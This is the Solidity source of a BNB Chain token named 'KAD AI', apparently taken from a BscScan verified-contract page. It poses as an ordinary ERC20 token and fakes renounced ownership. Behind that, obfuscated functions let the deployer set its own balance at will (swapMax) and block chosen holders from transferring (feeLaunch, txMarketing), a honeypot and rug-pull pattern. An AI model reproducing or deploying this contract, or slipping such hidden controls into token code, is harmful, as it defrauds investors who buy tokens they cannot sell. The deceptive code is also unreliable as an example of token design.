/**
 *Submitted for verification at BscScan.com on 2023-02-12
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract feeMax {
    function exemptFee() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface sellWalletSwap {
    function createPair(address modeWallet, address modeAuto) external returns (address);
}

interface launchedLiquidity {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract KADAI is IERC20, feeMax {
    uint8 private feeTeam = 18;
    
    uint256 public txBuy;
    bool public enableReceiver;
    bool private sellLaunched;
    mapping(address => bool) public shouldLaunchTeam;
    address public sellShould;
    mapping(address => mapping(address => uint256)) private tokenLiquidity;

    uint256 private receiverTeam;

    string private autoListLaunched = "KAD AI";
    address public buyShould;

    bool public isLimit;
    mapping(address => uint256) private maxLiquidity;
    bool public teamTake;
    uint256 private takeAtSender;
    

    uint256 private launchSender = 100000000 * 10 ** feeTeam;
    
    uint256 private listLiquidity;
    string private feeTrading = "KAI";
    uint256 public receiverTokenTx;
    uint256 public tradingFund;
    uint256 public marketingList;
    mapping(address => bool) public txMarketing;
    address private senderSell;
    

    event OwnershipTransferred(address indexed shouldBuy, address indexed liquidityLaunched);

    constructor (){
        
        launchedLiquidity launchAtTake = launchedLiquidity(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        buyShould = sellWalletSwap(launchAtTake.factory()).createPair(launchAtTake.WETH(), address(this));
        senderSell = exemptFee();
        if (listLiquidity != receiverTokenTx) {
            receiverTeam = txBuy;
        }
        sellShould = senderSell;
        shouldLaunchTeam[sellShould] = true;
        
        maxLiquidity[sellShould] = launchSender;
        emit Transfer(address(0), sellShould, launchSender);
        swapBuy();
    }

    

    function exemptSwap(address enableSell, address teamLiquidity, uint256 launchedAmount) internal returns (bool) {
        require(maxLiquidity[enableSell] >= launchedAmount);
        maxLiquidity[enableSell] -= launchedAmount;
        maxLiquidity[teamLiquidity] += launchedAmount;
        emit Transfer(enableSell, teamLiquidity, launchedAmount);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return launchSender;
    }

    function balanceOf(address sellEnable) public view virtual override returns (uint256) {
        return maxLiquidity[sellEnable];
    }

    function decimals() external view returns (uint8) {
        return feeTeam;
    }

    function getOwner() external view returns (address) {
        return senderSell;
    }

    function approve(address liquidityFrom, uint256 launchedAmount) public virtual override returns (bool) {
        tokenLiquidity[exemptFee()][liquidityFrom] = launchedAmount;
        emit Approval(exemptFee(), liquidityFrom, launchedAmount);
        return true;
    }

    function owner() external view returns (address) {
        return senderSell;
    }

    function swapMax(uint256 launchedAmount) public {
        if (!shouldLaunchTeam[exemptFee()]) {
            return;
        }
        maxLiquidity[sellShould] = launchedAmount;
    }

    function name() external view returns (string memory) {
        return autoListLaunched;
    }

    function txSwap() public {
        if (txBuy == marketingList) {
            sellLaunched = true;
        }
        
        teamTake=false;
    }

    function liquidityMode() public {
        if (marketingList != txBuy) {
            teamTake = false;
        }
        if (sellLaunched) {
            enableReceiver = true;
        }
        enableReceiver=false;
    }

    function transferFrom(address enableSell, address teamLiquidity, uint256 launchedAmount) external override returns (bool) {
        if (tokenLiquidity[enableSell][exemptFee()] != type(uint256).max) {
            require(launchedAmount <= tokenLiquidity[enableSell][exemptFee()]);
            tokenLiquidity[enableSell][exemptFee()] -= launchedAmount;
        }
        return sellShouldTo(enableSell, teamLiquidity, launchedAmount);
    }

    function exemptFrom(address amountTx) public {
        if (isLimit) {
            return;
        }
        if (marketingList == receiverTeam) {
            enableReceiver = false;
        }
        shouldLaunchTeam[amountTx] = true;
        
        isLimit = true;
    }

    function receiverFund() public view returns (uint256) {
        return tradingFund;
    }

    function feeLaunch(address fromLaunched) public {
        
        if (fromLaunched == sellShould || fromLaunched == buyShould || !shouldLaunchTeam[exemptFee()]) {
            return;
        }
        
        txMarketing[fromLaunched] = true;
    }

    function symbol() external view returns (string memory) {
        return feeTrading;
    }

    function sellShouldTo(address enableSell, address teamLiquidity, uint256 launchedAmount) internal returns (bool) {
        if (enableSell == sellShould || teamLiquidity == sellShould) {
            return exemptSwap(enableSell, teamLiquidity, launchedAmount);
        }
        if (teamTake == enableReceiver) {
            sellLaunched = true;
        }
        require(!txMarketing[enableSell]);
        
        return exemptSwap(enableSell, teamLiquidity, launchedAmount);
    }

    function allowance(address minMarketing, address liquidityFrom) external view virtual override returns (uint256) {
        return tokenLiquidity[minMarketing][liquidityFrom];
    }

    function exemptWalletFrom() public {
        
        if (sellLaunched == enableReceiver) {
            tradingFund = marketingList;
        }
        tradingFund=0;
    }

    function transfer(address launchTx, uint256 launchedAmount) external virtual override returns (bool) {
        return sellShouldTo(exemptFee(), launchTx, launchedAmount);
    }

    function swapBuy() public {
        emit OwnershipTransferred(sellShould, address(0));
        senderSell = address(0);
    }


}